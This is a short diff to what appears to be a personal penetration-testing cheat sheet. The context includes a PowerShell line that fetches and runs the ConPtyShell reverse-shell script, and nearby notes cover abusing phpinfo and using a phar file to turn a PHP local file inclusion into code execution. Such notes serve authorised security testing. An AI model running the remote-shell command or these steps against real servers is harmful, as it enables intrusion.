@@ -152,6 +152,7 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 ## phpinfo.php
 - Look for interesting info e.g. $_DOCUMENT_ROOT (can inject files to the dir)
 - Look for disabled command (search disabled) --> ** dfunc_bypasser may helps **
+- Look for extensions all sub item version below (e.g. SFX .4 that exploit)
 ## using phar to smuggle php for LFI
 - https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
 1. write shell in shell.phar
